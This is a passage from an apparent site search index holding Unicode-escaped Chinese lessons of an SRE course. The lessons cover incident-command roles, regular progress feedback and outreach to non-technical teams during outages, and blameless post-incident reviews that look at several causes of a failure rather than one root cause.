<p>\u5982\u679c\u95ee\u9898\u7591\u96be\uff0c\u5f71\u54cd\u8303\u56f4\u5f88\u5927\uff0c\u8fd9\u65f6SRE\u53ef\u4ee5\u8981\u6c42\u66f4\u9ad8\u7ea7\u522b\u7684\u4e3b\u7ba1\u4ecb\u5165\uff0c\u6bd4\u5982SRE\u4e3b\u7ba1\u6216\u603b\u76d1\u7b49\uff0c\u4e00\u822c\u7684\u539f\u5219\u662f\u8c01\u7684\u4e1a\u52a1\u53d7\u5f71\u54cd\u6700\u5927\uff0c\u8c01\u6765\u7275\u5934\u7ec4\u7ec7\u3002\u8fd9\u65f6SRE\u8981\u5c06IC\u7684\u804c\u8d23\u8f6c\u79fb\u7ed9\u66f4\u9ad8\u7ea7\u522b\u7684\u4e3b\u7ba1\uff0c\u5982\u679c\u662f\u5168\u7ad9\u8303\u56f4\u7684\u5f71\u54cd\uff0c\u5fc5\u8981\u65f6\u6280\u672fVP\u6216CTO\u4e5f\u53ef\u4ee5\u627f\u62c5IC\u804c\u8d23\uff0c\u6216\u8005\u6388\u6743\u7ed9\u67d0\u4f4d\u603b\u76d1\u627f\u62c5\u3002</p> </li> </ul> <p>\u4ece\u6211\u4eec\u7684\u5b9e\u8df5\u7ecf\u9a8c\u6765\u770b\uff0c\u5982\u679c\u662f\u5927\u8303\u56f4\u7684\u6545\u969c\uff0c\u4e00\u822c\u5c31\u662f\u5e73\u53f0\u6280\u672f\u603b\u76d1\u6216\u7535\u5546\u4e1a\u52a1\u7684\u6280\u672f\u603b\u76d1\u6765\u627f\u62c5IC\u804c\u8d23\uff0c\u63a5\u4e0b\u6765\u4ed6\u5c31\u53ef\u4ee5\u4ece\u66f4\u9ad8\u7684\u5c42\u9762\u7ec4\u7ec7\u548c\u534f\u8c03\u8d44\u6e90\u6295\u5165\u5e76\u6709\u6548\u534f\u4f5c\u3002\u8fd9\u65f6SRE\u4f1a\u56de\u5f52\u5230OL\u7684\u804c\u8d23\u4e0a\uff0c\u8d1f\u8d23\u7ec4\u7ec7\u548c\u534f\u8c03\u5177\u4f53\u7684\u6267\u884c\u6062\u590d\u64cd\u4f5c\u7684\u52a8\u4f5c\u3002</p>"},{"location":"ops/50-sre-mogu-07/#_5","title":"\u53cd\u9988\u673a\u5236","text":"<p>\u6709\u4e86\u89d2\u8272\u5206\u5de5\uff0c\u4e5f\u660e\u786e\u4e86\u6d41\u7a0b\uff0c\u90a3\u6574\u4e2a\u6545\u969c\u54cd\u5e94\u662f\u5426\u9ad8\u6548\u7684\u5173\u952e\u5c31\u662f\u6c9f\u901a\u673a\u5236\u4e86\uff0c\u8fd9\u91cc\u6211\u91cd\u70b9\u5206\u4eab\u4e0b\u6211\u4eec\u56e2\u961f\u5728\u53cd\u9988\u4e0a\u7684\u4e00\u4e9b\u7ecf\u9a8c\u548c\u5fc3\u5f97\u3002</p> <p>\u53cd\u9988\u7684\u91cd\u8981\u6027\u662f\u518d\u600e\u4e48\u5f3a\u8c03\u90fd\u4e0d\u4e3a\u8fc7\u7684\u3002\u6709\u65f6\u6d89\u53ca\u7684\u56e2\u961f\u548c\u4eba\u5458\u6bd4\u8f83\u591a\uff0c\u5f88\u591a\u5177\u4f53\u6267\u884c\u7684\u540c\u4e8b\u5c31\u53ea\u987e\u95f7\u5934\u5b9a\u4f4d\u548c\u6392\u67e5\u4e86\uff0c\u5f80\u5f80\u6ca1\u6709\u4efb\u4f55\u53cd\u9988\uff0c\u751a\u81f3\u505a\u4e86\u5f88\u591a\u7684\u64cd\u4f5c\u4e5f\u662f\u81ea\u884c\u51b3\u5b9a\uff0c\u4e0d\u505a\u901a\u62a5\u3002\u8fd9\u65f6\u5c31\u4f1a\u51fa\u73b0\u4e0a\u9762\u6848\u4f8b\u8bf4\u7684\u573a\u666f\uff0c\u6781\u6709\u53ef\u80fd\u884d\u751f\u6545\u969c\u6216\u8005\u5bfc\u81f4\u6545\u969c\u66f4\u5927\u8303\u56f4\u7684\u8513\u5ef6\uff0c\u8fd9\u662f\u6781\u4e3a\u5f71\u54cd\u534f\u4f5c\u6548\u7387\u548c\u51b3\u7b56\u7684\u3002</p> <p>\u6211\u4eec\u4e00\u822c\u8981\u6c42\u4ee5\u56e2\u961f\u4e3a\u5355\u4f4d\uff0c\u6bcf\u969410\uff5e15\u5206\u949f\u505a\u4e00\u6b21\u53cd\u9988\uff0c\u53cd\u9988\u5f53\u524d\u5904\u7406\u8fdb\u5c55\u4ee5\u53ca\u4e0b\u4e00\u6b65Action\uff0c\u5982\u679c\u4e2d\u9014\u6709\u9700\u8981\u9a6c\u4e0a\u6267\u884c\u4ec0\u4e48\u64cd\u4f5c\uff0c\u4e5f\u8981\u4e8b\u5148\u901a\u62a5\uff0c\u5e76\u4e14\u8981\u6c42\u901a\u62a5\u7684\u5185\u5bb9\u5305\u62ec\u5bf9\u4e1a\u52a1\u548c\u7cfb\u7edf\u7684\u5f71\u54cd\u662f\u4ec0\u4e48\uff0c\u6700\u540e\u7531IC\u51b3\u7b56\u540e\u518d\u6267\u884c\uff0c\u907f\u514d\u5fd9\u4e2d\u51fa\u9519\u3002</p> <p>\u8fd9\u91cc\u6211\u8981\u5f3a\u8c03\u4e00\u70b9\uff0c\u6ca1\u6709\u8fdb\u5c55\u4e5f\u662f\u8fdb\u5c55\uff0c\u4e5f\u8981\u53ca\u65f6\u53cd\u9988\u3002\u5f88\u591a\u56e2\u961f\u548c\u6210\u5458\u5f80\u5f80\u4f1a\u62b1\u6028\uff0c\u6211\u4e13\u5fc3\u5b9a\u4f4d\u95ee\u9898\u8fd8\u6ca1\u7ed3\u679c\u5462\uff0c\u6709\u4ec0\u4e48\u597d\u53cd\u9988\u7684\u5462\uff1f\u4f46\u662f\u6ca1\u6709\u8fdb\u5c55\u4e5f\u662f\u8fdb\u5c55\uff0cIC\u4f1a\u8ddfOL\u4ee5\u53ca\u56e2\u961f\u4e3b\u7ba1\u51b3\u7b56\u662f\u5426\u8981\u91c7\u53d6\u66f4\u6709\u6548\u679c\u7684\u63aa\u65bd\uff0c\u6bd4\u598210\u5206\u949f\u4e4b\u5185\u8fd8\u6ca1\u5b9a\u4f4d\u7ed3\u679c\uff0c\u53ef\u80fd\u6211\u4eec\u5c31\u4f1a\u9009\u62e9\u505a\u6709\u635f\u7684\u964d\u7ea7\u670d\u52a1\uff0c\u4e0d\u80fd\u8ba9\u6545\u969c\u6301\u7eed\u8513\u5ef6\uff0c\u8fd9\u4e2a\u65f6\u5019\uff0c\u53cd\u9988\u5c31\u663e\u5f97\u5c24\u4e3a\u91cd\u8981\u3002</p> <p>\u540c\u65f6\uff0c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u4e3a\u4e86\u5c3d\u91cf\u51cf\u5c11\u5bf9\u6267\u884c\u8005\u7684\u5e72\u6270\uff0c\u8ba9\u6267\u884c\u8005\u80fd\u591f\u66f4\u805a\u7126\uff0c\u6211\u4eec\u4e00\u822c\u8981\u6c42\u56e2\u961fLeader\u6765\u6536\u96c6\u53cd\u9988\u5e76\u4f20\u9012IC\u7684\u6307\u4ee4\u3002CL\u4e5f\u8981\u6536\u96c6\u4fe1\u606f\uff0c\u4ed6\u8981\u505a\u7684\u4e0d\u662f\u4f20\u8fbe\u6307\u4ee4\uff0c\u800c\u662f\u5728\u66f4\u5927\u8303\u56f4\u5185\u540c\u6b65\u6c47\u603b\u540e\u7684\u4fe1\u606f\uff0c\u540c\u65f6\u8fd8\u8981\u6574\u7406\u4fe1\u606f\u4f20\u9012\u7ed9\u5916\u90e8\u8054\u7cfb\u4eba\u3002</p> <p>\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u5728\u6545\u969c\u5904\u7406\u8fc7\u7a0b\u4e2d\uff0c\u7279\u522b\u662f\u5f71\u54cd\u8303\u56f4\u8f83\u5927\u7684\u6545\u969c\uff0c\u5176\u5b9e\u8fd8\u4f1a\u6d89\u53ca\u4e00\u7c7b\u975e\u6280\u672f\u7fa4\u4f53\uff0c\u8fd9\u4e00\u7c7b\u89d2\u8272Google SRE\u5e76\u6ca1\u6709\u63d0\uff0c\u4f46\u662f\u6211\u4eec\u5b9e\u8df5\u4e2d\u4f1a\u53d1\u73b0\u8fd9\u4e00\u90e8\u5206\u4eba\u4e5f\u975e\u5e38\u5173\u952e\uff0c\u6bd4\u5982\u5ba2\u670d\u3001PR\u4ee5\u53ca\u5546\u5bb6\u548c\u5176\u5b83\u5404\u7c7b\u5408\u4f5c\u4ee3\u8868\u7b49\u7b49\u3002</p> <p>\u4e3a\u4ec0\u4e48\u8bf4\u4ed6\u4eec\u4e5f\u975e\u5e38\u5173\u952e\u5462\uff1f\u56e0\u4e3a\u6211\u4eec\u8981\u77e5\u9053\uff0c\u6545\u969c\u4e4b\u6240\u4ee5\u5e26\u6765\u5de8\u5927\u7684\u538b\u529b\uff0c\u5f88\u5927\u7a0b\u5ea6\u4e0a\u662f\u56e0\u4e3a\u4e1a\u52a1\u5f71\u54cd\u5bfc\u81f4\u7684\u7528\u6237\u6295\u8bc9\u548c\u62b1\u6028\uff0c\u4ee5\u53ca\u5408\u4f5c\u4f19\u4f34\u4eec\u5229\u76ca\u53d7\u635f\u5e26\u6765\u7684\u5404\u7c7b\u8d1f\u9762\u60c5\u7eea\uff0c\u8fd9\u7c7b\u62b1\u6028\u548c\u60c5\u7eea\u6709\u65f6\u5019\u8fd8\u4f1a\u76f4\u63a5\u53d1\u6cc4\u5230\u516c\u53f8\u9ad8\u7ba1\u90a3\u91cc\uff0c\u8fd9\u65f6\u538b\u529b\u5c31\u4f1a\u5c42\u5c42\u900f\u4f20\u4e0b\u6765\u3002</p> <p>\u6240\u4ee5\uff0c\u9664\u4e86\u8981\u505a\u597d\u600e\u4e48\u5feb\u901f\u6062\u590d\u4e1a\u52a1\uff0c\u4fe1\u606f\u540c\u6b65\u7684\u53ca\u65f6\u548c\u900f\u660e\u4e5f\u975e\u5e38\u5173\u952e\uff0c\u5e76\u4e14\u6709\u4e9b\u5b89\u629a\u63aa\u65bd\u5fc5\u987b\u8981\u5feb\u901f\u6267\u884c\u5230\u4f4d\u3002</p> <p>\u6bd4\u5982\uff0c\u73b0\u5728\u66f4\u591a\u7684\u7528\u6237\u4e60\u60ef\u5728\u670b\u53cb\u5708\u3001\u5fae\u535a\u6216\u77e5\u4e4e\u8fd9\u6837\u7684\u793e\u4ea4\u5e73\u53f0\u53d1\u8868\u610f\u89c1\uff0c\u6240\u4ee5\u5728\u7528\u6237\u4e0d\u4e86\u89e3\u80cc\u666f\u4fe1\u606f\u7684\u65f6\u5019\uff0c\u4f1a\u8868\u8fbe\u4e00\u4e9b\u60c5\u7eea\uff0c\u751a\u81f3\u6709\u4e9b\u5a92\u4f53\u4e3a\u5438\u5f15\u773c\u7403\u505a\u5938\u5927\u6216\u62b9\u9ed1\u7684\u62a5\u9053\u3002\u4e3a\u4e86\u904f\u5236\u8fd9\u4e9b\u8d1f\u9762\u5f71\u54cd\uff0c\u516c\u53f8PR\u8981\u51fa\u9762\u4e0e\u5e73\u53f0\u6216\u5a92\u4f53\u6c9f\u901a\uff0c\u5e76\u901a\u8fc7\u8fd9\u4e9b\u793e\u4ea4\u5e73\u53f0\u7684\u5b98\u65b9\u8d26\u53f7\u505a\u7edf\u4e00\u7684\u4fe1\u606f\u540c\u6b65\uff0c\u505a\u5230\u53ca\u65f6\u900f\u660e\u3002</p> <p>\u518d\u6bd4\u5982\uff0c\u6545\u969c\u53ef\u80fd\u4f1a\u5bf9\u7528\u6237\u3001\u5546\u5bb6\u6216\u5408\u4f5c\u6e20\u9053\u9020\u6210\u5229\u76ca\u635f\u5931\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u8fd0\u8425\u548c\u4ea7\u54c1\u56e2\u961f\u53ca\u65f6\u5236\u5b9a\u8865\u507f\u7b56\u7565\uff0c\u4f8b\u5982\u8865\u507f\u4f18\u60e0\u5238\u7b49\uff0c\u5e76\u901a\u8fc7\u5ba2\u670d\u540c\u6b65\u7ed9\u7528\u6237\u548c\u5408\u4f5c\u4f19\u4f34\uff0c\u8fd9\u4e9b\u5bf9\u4e8e\u5b89\u629a\u7528\u6237\u60c5\u7eea\u81f3\u5173\u91cd\u8981\u3002</p> <p>\u6240\u4ee5\uff0c\u4e0a\u8ff0CL\u7684\u4fe1\u606f\u6536\u96c6\u3001\u6c47\u603b\u4ee5\u53ca\u4e0e\u975e\u6280\u672f\u56e2\u961f\u7684\u6c9f\u901a\u5c31\u81f3\u5173\u91cd\u8981\uff0c\u600e\u4e48\u6c9f\u901a\u5462\uff1f\u4e00\u5b9a\u4e0d\u662f\u7528\u6280\u672f\u672f\u8bed\uff0c\u800c\u662f\u4ee5\u5c3d\u91cf\u4e1a\u52a1\u5316\u7684\u8bed\u8a00\u63cf\u8ff0\uff0c\u5e76\u4e14\u8981\u7ed9\u5230\u5bf9\u65b9\u5927\u81f4\u7684\u9884\u671f\uff0c\u6bd4\u5982\u6211\u4eec\u6b63\u5728\u505a\u4ec0\u4e48\uff0c\u5927\u81f4\u591a\u957f\u65f6\u95f4\u4f1a\u6062\u590d\uff0c\u5982\u679c\u4e0d\u80fd\u6062\u590d\uff0c\u5927\u7ea6\u591a\u957f\u65f6\u95f4\u5185\u4f1a\u7ed9\u4e00\u4e2a\u53cd\u9988\u7b49\u7b49\u3002</p> <p>\u8fd9\u4e9b\u63aa\u65bd\u7684\u6709\u6548\u6267\u884c\uff0c\u4f1a\u5927\u5927\u51cf\u5c11\u6545\u969c\u4e4b\u5916\u7684\u5e72\u6270\u56e0\u7d20\uff0c\u8ba9\u6280\u672f\u56e2\u961f\u80fd\u591f\u66f4\u4e13\u6ce8\u4e8e\u6545\u969c\u672c\u8eab\u7684\u5904\u7406\u3002\u76f8\u53cd\uff0c\u5982\u679c\u8fd9\u4e9b\u4e8b\u60c5\u4e0d\u91cd\u89c6\uff0c\u6211\u4eec\u5c31\u4f1a\u53d1\u73b0\uff0c\u4f1a\u6709\u5404\u79cd\u6e20\u9053\u548c\u5404\u79cd\u5c42\u7ea7\u7684\u9886\u5bfc\u4ee5\u53ca\u63a5\u53e3\u4eba\u6765\u8d28\u95ee\u4f60\uff1a\u201c\u5230\u5e95\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5\u6062\u590d\uff1f\u4f60\u4eec\u7684\u7cfb\u7edf\u4e3a\u4ec0\u4e48\u603b\u662f\u8fd9\u4e48\u4e0d\u7a33\u5b9a\uff1f\u201d</p> <p>\u6240\u4ee5\uff0c\u5982\u679c\u6545\u969c\u7684\u5f71\u54cd\u8303\u56f4\u5f88\u5e7f\uff0c\u90a3\u6211\u4eec\u5c31\u8981\u8003\u8651\u5f97\u5c3d\u91cf\u5468\u5168\uff0c\u8fd9\u65f6\u7684\u6545\u969c\u5904\u7406\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\uff0c\u5c31\u4e0d\u5355\u5355\u662f\u6280\u672f\u56e2\u961f\u7684\u95ee\u9898\u4e86\uff0c\u800c\u662f\u9700\u8981\u6574\u4e2a\u516c\u53f8\u90fd\u6295\u5165\u8d44\u6e90\u7684\u3002</p> <p>\u8fd9\u6837\u9700\u8981\u5168\u516c\u53f8\u5171\u540c\u914d\u5408\u7684\u4e8b\u60c5\uff0c\u60f3\u8981\u5f88\u987a\u7545\u5730\u6267\u884c\uff0c\u90a3\u5c31\u4e00\u5b9a\u8981\u5728\u65e5\u5e38\u505a\u6f14\u7ec3\u3002\u540c\u65f6\u6709\u4e9b\u4e8b\u9879\u6bd4\u5982\u53cd\u9988\u4fe1\u606f\u7684\u6a21\u677f\uff0c\u5bf9\u5916\u901a\u62a5\u7684\u6a21\u677f\u90fd\u8981\u63d0\u524d\u5efa\u7acb\u597d\uff0c\u6bcf\u4e2a\u89d2\u8272\u53ea\u8981\u6309\u7167\u6a21\u677f\u586b\u5199\u5185\u5bb9\u5373\u53ef\uff0c\u53ef\u4ee5\u6781\u5927\u5730\u4fdd\u8bc1\u6c9f\u901a\u6548\u7387\u3002</p>"},{"location":"ops/50-sre-mogu-07/#_6","title":"\u603b\u7ed3","text":"<p>\u597d\u4e86\uff0c\u6211\u4eec\u6765\u505a\u4e0b\u603b\u7ed3\u3002</p> <p>\u6545\u969c\u5904\u7406\u8fc7\u7a0b\u4e2d\u6548\u7387\u5982\u4f55\uff0c\u5176\u5b9e\u53d6\u51b3\u4e8e\u4e09\u4e2a\u56e0\u7d20\uff1a</p> <ul> <li>\u6280\u672f\u5c42\u9762\u7684\u6545\u969c\u9694\u79bb\u624b\u6bb5\u662f\u5426\u5b8c\u5907\uff1b</li> <li>\u6545\u969c\u5904\u7406\u8fc7\u7a0b\u4e2d\u7684\u6307\u6325\u4f53\u7cfb\u662f\u5426\u5b8c\u5584\uff0c\u89d2\u8272\u5206\u5de5\u662f\u5426\u660e\u786e\uff1b</li> <li>\u6545\u969c\u5904\u7406\u673a\u5236\u4fdd\u969c\u662f\u5426\u7ecf\u8fc7\u8db3\u591f\u7684\u6f14\u7ec3\u3002</li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u60f3\u8981\u9ad8\u6548\u5730\u5904\u7406\u6545\u969c\uff0c\u5e76\u4e0d\u662f\u8bf4\u6211\u5728\u6280\u672f\u5c42\u9762\u505a\u5230\u5b8c\u5907\u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd9\u662f\u4e00\u4e2a\u9700\u8981\u4f53\u7cfb\u5316\u5efa\u8bbe\u548c\u53cd\u590d\u78e8\u70bc\u624d\u80fd\u6700\u7ec8\u8fbe\u6210\u7684\u76ee\u6807\u3002</p>"},{"location":"ops/50-sre-mogu-08/","title":"08\uff5c\u6545\u969c\u590d\u76d8\uff1a\u9ec4\u91d1\u4e09\u95ee\u4e0e\u5224\u5b9a\u4e09\u539f\u5219","text":"<p>\u524d\u4e24\u8bb2\uff0c\u6211\u4eec\u805a\u7126\u5728MTTR\u9636\u6bb5\uff0c\u6211\u8ddf\u4f60\u5206\u4eab\u4e86\u4ece\u6545\u969c\u53d1\u73b0\u5230\u6545\u969c\u5904\u7406\u7684\u4e00\u4e9b\u7ecf\u9a8c\u3002\u4f46\u662f\uff0c\u5373\u4fbf\u6211\u4eec\u8eab\u7ecf\u767e\u6218\uff0c\u505a\u8db3\u4e86\u51c6\u5907\uff0c\u6545\u969c\u7684\u53d1\u751f\u4f9d\u7136\u662f\u5f88\u96be\u907f\u514d\u7684\u3002\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u4e5f\u6ca1\u5fc5\u8981\u592a\u6cae\u4e27\uff0cSRE\u4e2d\u6709\u4e00\u6761\u5f88\u91cd\u8981\u7684\u539f\u5219\u53ef\u4ee5\u5e2e\u5230\u6211\u4eec\uff0c\u90a3\u5c31\u662f\u201c\u4ece\u6545\u969c\u4e2d\u5b66\u4e60\u548c\u63d0\u5347\u201d\uff0c\u4e5f\u5c31\u662f\u6545\u969c\u590d\u76d8\u3002</p> <p>\u90a3\u4e48\uff0c\u4eca\u5929\u6211\u4f1a\u4e13\u95e8\u7528\u4e00\u8282\u8bfe\uff0c\u6765\u548c\u4f60\u5206\u4eab\u6211\u5728\u6545\u969c\u590d\u76d8\u8fc7\u7a0b\u603b\u7ed3\u7684\u7ecf\u9a8c\u3002</p>"},{"location":"ops/50-sre-mogu-08/#_1","title":"\u6545\u969c\u590d\u76d8\u7684\u9ec4\u91d1\u4e09\u95ee","text":"<p>\u63d0\u8d77\u6545\u969c\u590d\u76d8\uff0c\u6211\u81ea\u5df1\u7684\u56e2\u961f\u4e5f\u662f\u8e29\u4e86\u5f88\u591a\u5751\uff0c\u8bf4\u51fa\u6765\u90fd\u662f\u8840\u6cea\u53f2\u3002</p> <p>\u6700\u5f00\u59cb\uff0c\u6211\u4eec\u575a\u4fe1\u65e2\u7136\u8981\u590d\u76d8\uff0c\u90a3\u5c31\u4e00\u5b9a\u8981\u8ffd\u6839\u6eaf\u6e90\uff0c\u627e\u5230\u6839\u56e0\uff0c\u6700\u597d\u662f\u4e00\u6b21\u6027\u89e3\u51b3\u6240\u6709\u95ee\u9898\uff0c\u4e00\u6b21\u6027\u628a\u4e8b\u60c5\u505a\u5bf9\u80af\u5b9a\u662f\u6700\u9ad8\u6548\u7684\u5440\u3002</p> <p>\u4f46\u662f\uff0c\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\uff0c\u5bf9\u4e8e\u6839\u56e0\u7684\u7406\u89e3\u548c\u5b9a\u4e49\uff0c\u6bcf\u4e2a\u4eba\u6216\u6bcf\u4e2a\u89d2\u8272\u90fd\u4e0d\u4e00\u6837\u3002\u800c\u4e14\uff0c\u4e00\u65e6\u8bbe\u5b9a\u4e3a\u627e\u6839\u56e0\uff0c\u90a3\u5c31\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u8fd8\u7279\u522b\u5bb9\u6613\u6839\u636e\u627e\u5230\u7684\u6839\u56e0\u6765\u5b9a\u8d23\uff0c\u5bfc\u81f4\u628a\u539f\u672c\u7684\u5bfb\u6c42\u6839\u56e0\u662f\u4ec0\u4e48\uff0c\u8f6c\u53d8\u4e3a\u201c\u8d23\u4efb\u662f\u8c01\u201d\u7684\u95ee\u9898\u3002\u672c\u6765\u662f\u60f3\u901a\u8fc7\u590d\u76d8\u6765\u5f15\u5bfc\u6539\u8fdb\u7684\uff0c\u4f46\u662f\u5f88\u5bb9\u6613\u753b\u98ce\u4e00\u53d8\uff0c\u5f00\u59cb\u63a8\u8bff\u626f\u76ae\uff0c\u6545\u969c\u590d\u76d8\u4f1a\u5c31\u5f00\u6210\u4e86\u6279\u6597\u4f1a\uff0c\u6bcf\u4e2a\u53c2\u4e0e\u7684\u4eba\u90fd\u8981\u627f\u53d7\u5f88\u5927\u7684\u5fc3\u7406\u538b\u529b\u3002</p> <p>\u6211\u8fd9\u4e48\u8bf4\uff0c\u4e0d\u77e5\u9053\u4f60\u662f\u4e0d\u662f\u6709\u540c\u611f\u3002\u63a5\u4e0b\u6765\u6211\u7ed9\u4f60\u8bb2\u4e24\u4e2a\u7279\u522b\u5e38\u89c1\u7684\u60c5\u51b5\uff0c\u4f60\u4e5f\u611f\u53d7\u4e0b\u3002</p> <p>\u6bd4\u5982\uff0c\u670d\u52a1\u5668\u6545\u969c\u5bfc\u81f4\u4e0a\u9762\u4e1a\u52a1\u4e5f\u53d1\u751f\u95ee\u9898\u4e86\uff0c\u4ece\u4e1a\u52a1\u5f00\u53d1\u540c\u5b66\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u8fd9\u80af\u5b9a\u662f\u56e0\u4e3a\u670d\u52a1\u5668\u4e0d\u7a33\u5b9a\u9020\u6210\u7684\u5440\uff0c\u6839\u56e0\u5c31\u662f\u670d\u52a1\u5668\u6545\u969c\u554a\uff01\u4f46\u662f\u4ece\u7cfb\u7edf\u7ef4\u62a4\u540c\u5b66\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u786c\u4ef6\u6545\u969c\u5c5e\u4e8e\u4e0d\u53ef\u63a7\u4e8b\u4ef6\uff0c\u6240\u4ee5\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6839\u56e0\u5e94\u8be5\u662f\u4e1a\u52a1\u5e94\u7528\u5c42\u6ca1\u6709\u505a\u5230\u9ad8\u53ef\u7528\u3002\u4f60\u770b\uff0c\u4e0d\u540c\u7684\u89d2\u5ea6\uff0c\u4e0d\u540c\u7684\u5206\u6790\u5224\u65ad\u3002\u5c31\u8fd9\u4e2a\u60c5\u51b5\u6765\u8bf4\uff0c\u4f60\u89c9\u5f97\u6839\u56e0\u662f\u4ec0\u4e48\uff1f</p> <p>\u518d\u6bd4\u5982\uff0c\u7f51\u7edc\u77ac\u65f6\u6296\u52a8\u4e86\u4e00\u4e0b\uff0c\u5bfc\u81f4\u5f88\u591a\u4e1a\u52a1\u8bf7\u6c42\u5931\u8d25\uff0c\u4e25\u91cd\u7684\u8fd8\u5bfc\u81f4\u4e86\u8bf7\u6c42\u963b\u585e\uff0c\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u90a3\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6839\u56e0\u662f\u4ec0\u4e48\uff1f\u662f\u7f51\u7edc\u4e0d\u597d\uff1f\u8fd8\u662f\u4e1a\u52a1\u5e94\u7528\u6ca1\u6709\u505a\u597d\u5bb9\u9519\u548c\u91cd\u8bd5\u8fd9\u79cd\u9ad8\u53ef\u7528\u673a\u5236\uff1f</p> <p>\u4e0a\u9762\u8fd9\u4e24\u79cd\u60c5\u51b5\u8fd8\u7b97\u7b80\u5355\u7684\u3002\u5982\u679c\u6211\u4eec\u5df2\u7ecf\u7528\u5230\u4e86\u516c\u6709\u4e91\u6216\u79c1\u6709\u4e91\uff0c\u57fa\u7840\u8bbe\u65bd\u90fd\u5df2\u7ecf\u5b8c\u5168\u662f\u7b2c\u4e09\u65b9\u63d0\u4f9b\u7684\u65f6\u5019\uff0c\u95ee\u9898\u5c31\u4e0d\u5355\u5355\u662f\u5185\u90e8\u7684\u8d23\u4efb\u4e4b\u4e89\u4e86\uff0c\u8fd8\u4f1a\u6d89\u53ca\u7532\u4e59\u53cc\u65b9\u4e4b\u95f4\u7684\u5b9a\u8d23\uff0c\u5fc5\u5b9a\u4f1a\u51fa\u73b0\u66f4\u591a\u5927\u7684\u5229\u76ca\u4e89\u6267\u3002\u8fd9\u6837\u7684\u4e89\u6267\u591a\u4e86\uff0c\u4e00\u5730\u9e21\u6bdb\uff0c\u4f46\u662f\u5bf9\u6539\u8fdb\u6ca1\u6709\u4efb\u4f55\u5e2e\u52a9\u3002</p> <p>\u540e\u6765\u6211\u4eec\u7684\u6545\u969c\u590d\u76d8\u505a\u5f97\u8d8a\u6765\u8d8a\u591a\uff0c\u53d1\u73b0\u5728\u771f\u5b9e\u7684\u573a\u666f\u4e0b\uff0c\u9020\u6210\u6545\u969c\u53d1\u751f\u7684\u56e0\u7d20\u786e\u5b9e\u4f1a\u6709\u5f88\u591a\uff1b\u800c\u4e14\u6545\u969c\u5904\u7406\u65f6\u95f4\u8fc7\u957f\uff0c\u8fdf\u8fdf\u65e0\u6cd5\u6062\u590d\u7684\u539f\u56e0\u4e5f\u4f1a\u6709\u5f88\u591a\uff0c\u5982\u679c\u518d\u51fa\u73b0\u4e86\u884d\u751f\u6545\u969c\uff0c\u53ef\u80fd\u53c8\u4f1a\u6709\u5404\u79cd\u5176\u4ed6\u7684\u539f\u56e0\u3002</p> <p>\u7ecf\u5386\u8fc7\u8fd9\u6837\u5f88\u75db\u82e6\u7684\u9636\u6bb5\u540e\uff0c\u6211\u4eec\u603b\u7ed3\u51fa\u4e00\u6761\u5f88\u91cd\u8981\u7684\u7ecf\u9a8c\u548c\u89c2\u70b9\uff0c\u751a\u81f3\u662f\u98a0\u8986\u4f60\u5bf9\u6545\u969c\u6839\u56e0\u8ba4\u77e5\u7684\u89c2\u70b9\uff1a\u6545\u969c\u6839\u56e0\u4e0d\u6b62\u4e00\u4e2a\uff0c\u4e0e\u5176\u4e89\u8bba\u6839\u56e0\u662f\u4ec0\u4e48\uff0c\u4e0d\u5982\u4e00\u8d77\u770b\u770b\u5f15\u8d77\u6545\u969c\u7684\u539f\u56e0\u90fd\u6709\u54ea\u4e9b\uff0c\u662f\u4e0d\u662f\u90fd\u6709\u6539\u8fdb\u7684\u7a7a\u95f4\u3002</p> <p>\u601d\u8def\u8f6c\u53d8\u540e\uff0c\u6211\u4eec\u4f1a\u5c06\u6240\u6709\u5bfc\u81f4\u6545\u969c\u548c\u884d\u751f\u6545\u969c\u53d1\u751f\u3001\u4e1a\u52a1\u6062\u590d\u8fc7\u7a0b\u4e2d\u8017\u65f6\u8f83\u957f\u3001\u4ee5\u53ca\u505a\u51fa\u9519\u8bef\u51b3\u7b56\u7684\u539f\u56e0\u548c\u73af\u8282\u90fd\u63d0\u70bc\u51fa\u6765\uff0c\u628a\u8fd9\u4e9b\u90fd\u7b97\u662f\u6545\u969c\u539f\u56e0\uff0c\u7136\u540e\u9488\u5bf9\u8fd9\u4e9b\u95ee\u9898\u548c\u73af\u8282\u5236\u5b9a\u6539\u8fdb\u63aa\u65bd\u3002</p> <p>\u90a3\u8fd9\u4e9b\u539f\u56e0\u548c\u73af\u8282\u8be5\u600e\u4e48\u627e\u5462\uff1f\u6211\u4eec\u5728\u505a\u6545\u969c\u590d\u76d8\u7684\u65f6\u5019\uff0c\u9996\u5148\u4f1a\u7ed3\u5408Timeline\u6765\u505a\uff0c\u4e5f\u5c31\u662f\u6309\u7167MTTI\u3001MTTK\u3001MTTF\u548cMTTV\u5148\u505a\u4e00\u4e2a\u5206\u7c7b\uff1b\u7136\u540e\u9488\u5bf9\u8017\u65f6\u957f\u7684\u73af\u8282\uff0c\u53cd\u590d\u8ba8\u8bba\u6539\u8fdb\u63aa\u65bd\u662f\u4ec0\u4e48\uff1b\u6700\u540e\u5b9a\u597d\u8d23\u4efb\u4eba\u548c\u65f6\u95f4\u70b9\uff0c\u540e\u7eed\u6301\u7eed\u8ddf\u8fdb\u6267\u884c\u72b6\u51b5\u3002</p> <p>\u5982\u679c\u628a\u8fd9\u4e9b\u7ecf\u9a8c\u518d\u63d0\u70bc\u4e00\u4e0b\uff0c\u90a3\u5c31\u662f\u6211\u4eec\u603b\u7ed3\u51fa\u6765\u7684\u6545\u969c\u590d\u76d8\u9ec4\u91d1\u4e09\u95ee\uff1a</p> <ul> <li> <p>\u7b2c\u4e00\u95ee\uff1a\u6545\u969c\u539f\u56e0\u6709\u54ea\u4e9b\uff1f</p> </li> <li> 